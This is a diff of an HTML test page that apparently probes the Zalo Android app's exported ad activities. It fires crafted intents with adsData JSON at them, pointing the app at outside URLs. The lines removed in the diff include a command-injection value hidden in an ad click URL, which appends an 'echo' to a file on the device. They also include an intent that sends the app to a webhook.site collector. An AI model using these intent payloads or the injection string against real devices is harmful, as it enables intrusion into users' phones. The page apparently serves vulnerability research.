@@ -5,61 +5,10 @@
     </head>
     <body>
         <h1>zalo.html</h1>
-        <a style='font-size: 2.0em;' href="https://5017-121-190-139-95.ngrok-free.app/download">Download 1</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="https://5017-121-190-139-95.ngrok-free.app/ho">Download 2</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="https://5017-121-190-139-95.ngrok-free.app/first/second">Download 3</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="data:image/png;filename=/test.png,base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=" download>Download (DATA) 1</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="javascript:tryDownload();">Download (DATA) 2</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=" download>Download (DATA) 3</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsLanding;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsLanding=https://iiiiiiliiiliil.github.io/blog/zadslanding.html;end;">ZAdsLanding</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href="intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsScenario;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsScenario=https://webhook.site/513d2789-fd59-4147-99b9-d723d74376ec;end;">ZAdsScenario</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;end;'>ZAdsActivity 01</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsData={"adsInfo":0,"adsRender":0};end;'>ZAdsActivity 02</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsData={"adsInfo":{},"adsRender":{}};end;'>ZAdsActivity 03</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsData={"1":{},"2":{}};end;'>ZAdsActivity 04</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsData={"adsInfo":{"kind":"html"},"adsRender":{"kind":"html"}};end;'>ZAdsActivity 05</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='intent:#Intent;component=com.zing.zalo/com.adtima.ads.ZAdsActivity;package=com.zing.zalo;action=android.intent.action.VIEW;S.adsData={"ads":{"kind":"html","template_0":"file:fullpage_native_0.html","template_1","file:fullpage_native_0.html","template_2","file:fullpage_native_0.html"}};end;'>ZAdsActivity 06</a>
-        <br/>
-        <br/>
-        <a style='font-size: 2.0em;' href='javascript: goZAdsActivity()'>ZAdsActivity 99</a>
+        <a style='font-size: 2.0em;' href='javascript: goZAdsActivity()'>ZAdsActivity</a>
     </body>
 
     <script>
-        function tryDownload() {
-            let data = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=';
-            let blob = new Blob([data], { type: 'image/png' });
-            let link = document.createElement('a');
-            link.href = window.URL.createObjectURL(blob);
-            link.download = '';
-            link.click();
-        }
-        
         function goZAdsActivity() {
             let data = {};
             
@@ -69,11 +18,11 @@
             data['adsInfo']['title'] = 'x';
             data['adsInfo']['displayInfo'] = 'x';
             data['adsInfo']['actionText'] = 'x';
-            data['adsInfo']['actionType'] = '';
+            data['adsInfo']['actionType'] = 'x';
             data['adsInfo']['clickTo'] = 'x';
             data['adsInfo']['actionTo'] = 'x';
             data['adsInfo']['tokenId'] = 'x';
-            data['adsInfo']['jumpTarget'] = 'xxxxxx';
+            data['adsInfo']['jumpTarget'] = 'x';
             data['adsInfo']['logoBannerFile'] = 'x';
             data['adsInfo']['portraitCoverUrl'] = 'https://iiiiiiliiiliil.github.io/blog/temp.html';
             data['adsInfo']['landscapeCoverUrl'] = 'x';
@@ -84,13 +33,13 @@
             data['adsInfo']['appCaption'] = 'x';
             data['adsInfo']['appDescription'] = 'x';
             data['adsInfo']['contextString'] = 'x';
-            data['adsInfo']['kind'] = 'native';
+            data['adsInfo']['kind'] = 'html';
             data['adsInfo']['appStore'] = 'x';
             data['adsInfo']['adPackage'] = 'x';
             data['adsInfo']['vastLink'] = 'x';
             data['adsInfo']['daastLink'] = 'x';
             data['adsInfo']['videoMode'] = 'x';
-            data['adsInfo']['contentScheme'] = '';
+            data['adsInfo']['contentScheme'] = 'x';
             data['adsInfo']['metaData'] = 'x';
             data['adsInfo']['excludeOr'] = 'x';
             data['adsInfo']['excludeAnd'] = 'x';
@@ -101,7 +50,7 @@
             data['adsInfo']['nonServing'] = 'x';
             data['adsInfo']['activeView'] = 'x';
             data['adsInfo']['impression'] = 'x';
-            data['adsInfo']['click'] = "https://www.naver.com%3Becho%24%7BIFS%7DInjected%3E%3E/storage/emulated/0/Download/cmd";
+            data['adsInfo']['click'] = 'x';
             data['adsInfo']['action'] = 'x';
             data['adsInfo']['conversion'] = 'x';
             data['adsInfo']['feedback'] = 'x';
@@ -127,7 +76,7 @@
             data['adsInfo']['appFlyer'] = false;
             data['adsInfo']['allowSkip'] = false;
             data['adsInfo']['addClickTag'] = false;
-            data['adsInfo']['clickable'] = true;
+            data['adsInfo']['clickable'] = false;
             data['adsInfo']['omEnable'] = false;
             data['adsInfo']['expandBanner'] = [];
             data['adsInfo']['creativeView'] = [];
@@ -140,8 +89,8 @@
             data['adsInfo']['trackThirdClick'] = [];
             
             data['adsRender'] = {};
-            data['adsRender']['kind'] = 'a';
-            data['adsRender']['template_0'] = "%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Ch1%20style=%5C%22color:%20white%3B%5C%22%3Etemplate_0%3C/h1%3E%3C/body%3E%3C/html%3E";
+            data['adsRender']['kind'] = 'x';
+            data['adsRender']['template_0'] = 'x';
             data['adsRender']['template_1'] = 'x';
             data['adsRender']['template_2'] = 'x';
             
